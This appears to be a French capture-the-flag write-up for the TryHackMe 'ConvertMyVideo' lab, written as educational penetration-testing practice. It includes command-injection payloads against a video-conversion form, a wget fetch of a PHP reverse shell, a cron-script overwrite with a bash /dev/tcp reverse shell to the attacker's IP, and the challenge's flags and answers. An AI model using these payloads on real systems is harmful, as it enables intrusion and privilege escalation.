# ConvertMyVideo #

## Task 1 Hack the machine ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.11.174 convertmyvideo.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A convertmyvideo.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-27 19:27 CEST
Nmap scan report for convertmyvideo.thm (10.10.11.174)
Host is up (0.033s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/27%OT=22%CT=1%CU=34117%PV=Y%DS=2%DC=T%G=Y%TM=612920A
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1
OS:1NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   32.19 ms 10.9.0.1
2   32.33 ms convertmyvideo.thm (10.10.11.174)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.31 seconds

```

Nmap nous montre 2 services :
Le service  SSH sur le port 22.
Le service HTTP sur le port 80.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://convertmyvideo.thm -w /usr/share/dirb/wordlists/common.txt -q
/.htpasswd            (Status: 403) [Size: 283]
/.hta                 (Status: 403) [Size: 283]
/.htaccess            (Status: 403) [Size: 283]
/admin                (Status: 401) [Size: 465]
/images               (Status: 301) [Size: 325] [--> http://convertmyvideo.thm/images/]
/index.php            (Status: 200) [Size: 747]                                        
/js                   (Status: 301) [Size: 321] [--> http://convertmyvideo.thm/js/]    
/server-status        (Status: 403) [Size: 283]                                        
/tmp                  (Status: 301) [Size: 322] [--> http://convertmyvideo.thm/tmp/]   

```

**What is the name of the secret folder?**

D'après les résultats de gobuster le répertoire caché est : admin

Quand on va sur la page admin on nous demande un mode de passe.   


```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://convertmyvideo.thm

<html>
   <head>
      <script type="text/javascript" src="/js/jquery-3.5.0.min.js"></script>
      <script type="text/javascript" src="/js/main.js"></script>
      <link rel="stylesheet" type="text/css" href="/style.css">
   </head>
   <body>
      <div id="container">
         <div id="logos">
            <img src="images/youtube.png" alt="Youtube to MP3" height="200" width="200" />
            <img src="images/mp3-file.png" alt="Youtube to MP3" height="200" width="200" />
         </div>
         <h3>Convert My Video</h3>
         <label for="ytid">Video ID:</label><input type="text" id="ytid" name="ytid">
         <button type="button" id="convert">Convert!</button>
         <span id="message"></span>
      </div>
   </body>
</html>

```

Dans le code source on remarque un fichier main.js.    

```js
</html>tim@kali:~/Bureau/tryhackme/write-up$ curl http://convertmyvideo.thm/js/main.js

$(function () {
    $("#convert").click(function () {
        $("#message").html("Converting...");
        $.post("/", { yt_url: "https://www.youtube.com/watch?v=" + $("#ytid").val() }, function (data) {
            try {
                data = JSON.parse(data);
                if(data.status == "0"){
                    $("#message").html("<a href='" + data.result_url + "'>Download MP3</a>");
                }
                else{
                    console.log(data);
                    $("#message").html("Oops! something went wrong");
                }
            } catch (error) {
                console.log(data);
                $("#message").html("Oops! something went wrong");
            }
        });
    });

});
```

On remarque que c'est le script qui gère la conversion de la vidéo.    
Son fonctionnent c'est de faire un POST sur paramètre de nom yt_url.
Dans le paramètre on met l'adresse de youtube en passant l'ID dans v.    

![page2](./Task1-02.png)

Dans le mode développeur de firefox F12, dans la console, on passe une commande pour voire si le script est vulnérable.   
Dans la console quand on passe la requête $.post\("/",\{ yt_url: ";id;"\}\) on a comme réponse dans Response JSON, le retour de la commande id qui est : uid=33\(www-data\) gid=33\(www-data\) groups=33\(www-data\)

Donc on peut exécuter des commandes sur la machine cible.  


```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://raw.githubusercontent.com/timruff/php-reverse-shell/master/php-reverse-shell.php -nv
2021-08-28 10:11:53 URL:https://raw.githubusercontent.com/timruff/php-reverse-shell/master/php-reverse-shell.php [5491/5491] -> "php-reverse-shell.php" [1]

tim@kali:~/Bureau/tryhackme/write-up$ sed -i 's/127.0.0.1/10.9.228.66/g' php-reverse-shell.php

tim@kali:~/Bureau/tryhackme/write-up$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
``

On prépare notre reverse shell.    
On lance un serveur html pour que la machine cible récupère le reverse shell.   

![page3](./Task1-03.png)

Dans le mode développeur de firefox, dans la console on met la commande : $.post\(\"/\",\{ yt_url: \";wget$\{IFS\}http://10.9.228.66:8000/php-reverse-shell.php;\"}).    
Grace à cette commande on télécharge notre reverse shell.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
listening on [any] 1234 ...
```

On écoute le port 1234 pour se connecter au reverse shell.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://convertmyvideo.thm/php-reverse-shell.php
```

On exécute le reverse shell.   

```bash
$ cd / 
$ cd /var/www/
$ ls
html
$ cd html
$ ls
admin
images
index.php
js
php-reverse-shell.php
style.css
tmp
$ cd admin
$ ls -al
total 24
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 .
drwxr-xr-x 6 www-data www-data 4096 Aug 29 21:03 ..
-rw-r--r-- 1 www-data www-data   98 Apr 12  2020 .htaccess
-rw-r--r-- 1 www-data www-data   49 Apr 12  2020 .htpasswd
-rw-r--r-- 1 www-data www-data   39 Apr 12  2020 flag.txt
-rw-rw-r-- 1 www-data www-data  202 Apr 12  2020 index.php
$ cat .htpasswd
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```

Dans le site web dans le répertoire admin on trouve les identifiants dans le fichier .htpasswd, qui sont les identifiants de la page qui nous demande des identifiants.    

La réponse est : itsmeadmin    

**What is the user flag**

```bash
$ pwd     
/var/www/html/admin
$ cat flag.txt
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```   

Dans le dossier admin on trouve le fichier flag.txt, on le lit et on a le flag.    

La réponse est : flag{0d8486a0c0c42503bb60ac77f4046ed7}    

**What is the root flag?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 -nv
2021-08-29 23:30:41 URL:https://github-releases.githubusercontent.com/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210829%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210829T213041Z&X-Amz-Expires=300&X-Amz-Signature=57cb59da83cfab44297996fa258118037f247ac1c45cb39d7dc105d66892667f&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream [3078592/3078592] -> "pspy64" [1]

tim@kali:~/Bureau/tryhackme/write-up$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

------------------------------

$ cd /tmp
$ wget http://10.9.228.66:8000/pspy64 -nv
2021-08-29 21:32:22 URL:http://10.9.228.66:8000/pspy64 [3078592/3078592] -> "pspy64" [1]
$ chmod +x ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
...
2021/08/29 21:34:01 CMD: UID=0    PID=1905   | bash /var/www/html/tmp/clean.sh 
2021/08/29 21:34:01 CMD: UID=0    PID=1904   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh 
2021/08/29 21:34:01 CMD: UID=0    PID=1903   | /usr/sbin/CRON -f 
2021/08/29 21:35:01 CMD: UID=0    PID=1910   | bash /var/www/html/tmp/clean.sh 
2021/08/29 21:35:01 CMD: UID=0    PID=1909   | bash /var/www/html/tmp/clean.sh 
2021/08/29 21:35:01 CMD: UID=0    PID=1908   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh 
2021/08/29 21:35:01 CMD: UID=0    PID=1907   | /usr/sbin/CRON -f 

```

On télécharge pspy sur la machine cible.
On l'exécute et on remarque que \/var\/www\/html\/tmp\/clean.sh est exécute toute les minutes.   

```bash
$ cd /var/www/html/tmp
$ cat clean.sh
rm -rf downloads
$ ls -al
total 12
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 .
drwxr-xr-x 6 www-data www-data 4096 Aug 29 21:03 ..
-rw-r--r-- 1 www-data www-data   17 Apr 12  2020 clean.sh
```

On voit que l'on peut modifier clean.sh.   

```bash
$ echo 'bash -i >& /dev/tcp/10.9.228.66/1337 0>&1' > clean.sh
```

On insert un reverse shell.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lnvp 1337
listening on [any] 1337 ...
```

On écoute pour se connecter au reverse shell.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.9.228.66] from (UNKNOWN) [10.10.38.181] 54470
bash: cannot set terminal process group (2105): Inappropriate ioctl for device
bash: no job control in this shell
root@dmv:/var/www/html/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
root@dmv:/var/www/html/tmp# cat /root/root.txt
cat /root/root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
```

On obtient un shell avec les droits root.    
On lit le fichier root.txt dans root et on a notre flag.   

La réponse est : flag{d9b368018e912b541a4eb68399c5e94a}     

